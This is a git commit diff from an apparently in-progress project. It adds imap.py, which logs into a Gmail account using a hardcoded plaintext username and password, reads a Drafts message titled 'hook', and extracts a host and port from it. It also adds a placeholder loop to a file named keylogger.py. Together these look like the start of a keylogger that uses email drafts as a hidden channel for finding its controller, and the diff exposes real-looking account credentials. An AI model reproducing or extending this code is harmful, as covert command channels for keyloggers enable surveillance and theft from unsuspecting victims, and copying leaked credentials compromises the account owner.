aa61e82532c3fe51f9779ad0325213921dc85c62
arunnair018@gmail.com <arunnair018@gmail.com>
2019-09-05 17:47:18 +0530

    added mail

---
+++ imap.py
@@ -0,0 +1,28 @@
+import imaplib
+import email
+
+def get_server():	
+	username = 'arun.kumar@mtech.christuniversity.in'
+	password = '90098920'
+	mail = imaplib.IMAP4_SSL('imap.gmail.com')
+	mail.login(username,password)
+	mail.select("[Gmail]/Drafts")
+	try:
+		result,ids = mail.uid('search', None, '(HEADER Subject "hook")')
+		uids = ids[0].decode('utf-8').split()
+		result, data = mail.uid('fetch', uids[-1], '(RFC822)')
+		raw = data[0][1].decode('utf-8')
+		smail = email.message_from_string(raw)
+		part=[]
+		if smail.is_multipart():
+		    for i in smail.get_payload():
+		        part.append(i.get_payload())
+		cmd = part[0].strip('\r\n')
+	except:
+		cmd=None
+	mail.close()
+	mail.logout()
+	cmd = cmd.split(':')
+	host = cmd[0]
+	port = cmd[1]
+	return host,port
--- keylogger.py
+++ keylogger.py
@@ -1,2 +1,6 @@
 import time
 import os
+while True:
+	if int(time.strftime("%M"))%10 == 0:
+		print(time.strftime("%M")+'hello world')
+		time.sleep(60)
